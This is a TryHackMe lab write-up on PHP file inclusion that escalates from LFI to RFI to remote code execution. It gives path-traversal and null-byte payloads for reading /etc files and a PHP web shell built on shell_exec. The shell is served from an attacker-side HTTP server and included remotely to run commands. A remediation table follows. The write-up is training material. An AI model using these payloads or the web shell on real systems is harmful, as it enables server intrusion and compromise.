# 📂 Lab: File Inclusion (LFI → RFI → RCE)

![TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-blue?style=for-the-badge&logo=tryhackme)
![Vulnerability](https://img.shields.io/badge/Type-LFI%20%7C%20RFI%20%7C%20RCE-red?style=for-the-badge)
![Difficulty](https://img.shields.io/badge/Difficulty-Beginner%2FIntermediate-orange?style=for-the-badge)

---

## 📖 Overview

This lab demonstrates how improper file handling in PHP applications can be exploited to escalate from **Local File Inclusion (LFI)** to **Remote File Inclusion (RFI)** and finally achieve **Remote Code Execution (RCE)**.

The walkthrough covers multiple attack vectors, including POST manipulation, cookie injection, path traversal, and null byte injection.

---

## 🔍 Vulnerability Analysis

The vulnerable PHP code used by the application:

```php
<?php
$profile = $_REQUEST['file'];
include($profile);
?>
⚠️ Security Risk
User-controlled input is passed directly to include() without validation, allowing:

Reading sensitive files (LFI / Path Traversal)

Including remote files (RFI)

Executing arbitrary PHP code (RCE)

🚩 Challenge Walkthrough
1️⃣ Challenge 1 — LFI via POST
Scenario

The form does not accept GET parameters

The backend expects a POST request

Exploitation

Modified the form method from GET to POST

Submitted the following payload:

text
Копировать код
file=/etc/flag1
Result

✅ Flag 1 successfully retrieved

2️⃣ Challenge 2 — Cookie Injection & Path Traversal
Scenario

Access restricted to admins

Authorization based on a cookie

Analysis

Default cookie value: THM=Guest

Changing it to Admin grants access

Application appends .php to the cookie value

Exploitation

Used Path Traversal to escape the directory

Used Null Byte injection to bypass .php extension

text
Копировать код
THM=../../../../etc/flag2%00
Result

✅ Flag 2 retrieved

text
Копировать код
c00k13_i5_yuMmy1
3️⃣ Challenge 3 — Multi‑Vector File Inclusion
Scenario

Backend validates multiple inputs simultaneously:

POST parameter

Cookie

Token

Exploitation

Injected the payload into all required parameters

text
Копировать код
../../../../etc/flag3%00
Result

✅ Flag 3 successfully retrieved

💥 Path to RCE (Remote Code Execution)
🎯 Objective
Execute system commands on the target host via Remote File Inclusion

Step 1️⃣ — Prepare the Web Shell
Created a malicious PHP file to execute system commands:

php
Копировать код
<?php
echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
Step 2️⃣ — Host the Payload
Started a local HTTP server on the attacker machine:

bash
Копировать код
python3 -m http.server 9001
Step 3️⃣ — Trigger RFI
Injected the remote file via the vulnerable endpoint:

text
Копировать код
http://<TARGET-IP>/playground.php?file=http://<ATTACKBOX-IP>:9001/shell.php&cmd=hostname
✅ Result
Command Executed

text
Копировать код
hostname
Output

text
Копировать код
lfi-vm-thm-f8c5b1a78692
Impact

🔥 Full Remote Code Execution achieved

🔥 Complete system compromise possible

🛡️ Remediation & Best Practices
Issue	Mitigation
Unsafe include()	Use a strict whitelist
RFI	Disable allow_url_include
Path Traversal	Normalize and validate paths
Privilege Abuse	Run services with least privilege
Auth via Cookies	Never trust client-side authorization

🏁 Conclusion
This lab clearly demonstrates how a simple file inclusion vulnerability can escalate into full server compromise.

Understanding how to combine multiple input vectors (POST, Cookies, Tokens) is essential for real‑world web penetration testing.

Author: CyberDat
Date: January 2026
Platform: TryHackMe
